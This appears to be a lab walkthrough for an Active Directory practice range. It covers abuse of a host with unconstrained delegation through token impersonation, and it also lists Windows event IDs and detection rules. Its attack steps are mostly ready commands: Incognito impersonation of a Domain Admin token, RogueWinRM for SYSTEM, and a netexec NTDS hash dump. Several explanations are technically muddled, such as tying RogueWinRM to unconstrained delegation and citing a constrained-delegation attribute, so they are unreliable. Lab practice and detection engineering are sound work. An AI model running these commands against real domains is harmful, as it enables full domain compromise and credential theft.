# WT#032 — Token Impersonation

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | mbr01 (192.168.77.22) |
| **Domain** | child.cadre.local |
| **Starting Credential** | Code execution on mbr01 (low-priv or SYSTEM) |
| **Tools Required** | RogueWinRM, Incognito (Metasploit), Seatbelt |
| **Certifications** | OSCP+, HTB-CAPE |
| **MITRE ATT&CK** | T1134.003 (Token Impersonation/Theft), T1550.002 (Use Alternate Authentication Material) |
| **Difficulty** | Medium |

## Prerequisites
- Code execution on mbr01 (low-priv or admin)
- mbr01 has **unconstrained delegation** enabled (`msDS-AllowedToDelegateTo` not set, `TrustedForDelegation = True`)
- mbr01$ computer account has `TrustedForDelegation` flag
- Privileged users/services authenticate to mbr01

## Attack Steps

### 1. Verify delegation configuration

```powershell
# On mbr01 — check if unconstrained delegation is enabled
Seatbelt.exe -group=system | Select-String "Delegation"

# Via LDAP from attacker machine
netexec ldap 192.168.77.10 -u user -p pass --trusted-for-delegation
```

### 2. List available tokens

```powershell
# Using Incognito (Metasploit)
meterpreter > load incognito
meterpreter > list_tokens -u

# Or via native PowerShell
whoami /priv
```

### 3. Capture token with RogueWinRM

```powershell
# On mbr01 — triggers BITS service to connect back as SYSTEM
RogueWinRM.exe -p "C:\Windows\System32\cmd.exe" -a "/c whoami > C:\Users\Public\token.txt"
```

RogueWinRM exploits BITS service to obtain a SYSTEM token via unconstrained delegation.

### 4. Impersonate captured token

```powershell
# With Incognito
meterpreter > impersonate_token child\\Domain-Admin

# Verify impersonation
meterpreter > getuid
> Server username: child\Domain-Admin
```

### 5. DCSync via impersonated token

```powershell
# With impersonated domain admin token
netexec smb 192.168.77.10 -u child\\Domain-Admin --ntds
```

## Post-Exploitation Chain
```
Code Exec on mbr01 (WT#032 start)
  └──> Token Impersonation (unconstrained delegation)
       ├──> Impersonate Domain Admin token
       │    └──> DCSync → Full domain compromise
       ├──> Impersonate Service Account token
       │    └──> Service credential extraction
       └──> Impersonate Machine Account token
            └──> Lateral movement to other trusted-for-delegation hosts
```

## Telemetry Verification
**On mbr01 (Security Event Logs):**
- **Event ID 4624** (Logon Type 3 — network logon with delegation)
- **Event ID 4672** (Special Logon — SeImpersonatePrivilege)
- **Event ID 4688** (Process creation via token impersonation)
- **Event ID 4648** (Logon using explicit credentials)

**On dc01 (Kerberos Events):**
- **Event ID 4768** (TGT request with forwardable flag — delegation grant)
- **Event ID 4769** (TGS request — delegation S4U2proxy)

**Detection Rules:**
- `Event ID 4672` with `SeImpersonatePrivilege` enabled on non-SYSTEM account
- Process ownership mismatch (SYSTEM-owned process created by user token)
- Delegation events (`Event ID 4769`) where source host has `TrustedForDelegation = True`

## Status
**CONFIGURED** — mbr01 has unconstrained delegation enabled; token capture and impersonation via RogueWinRM/Incognito is functional.
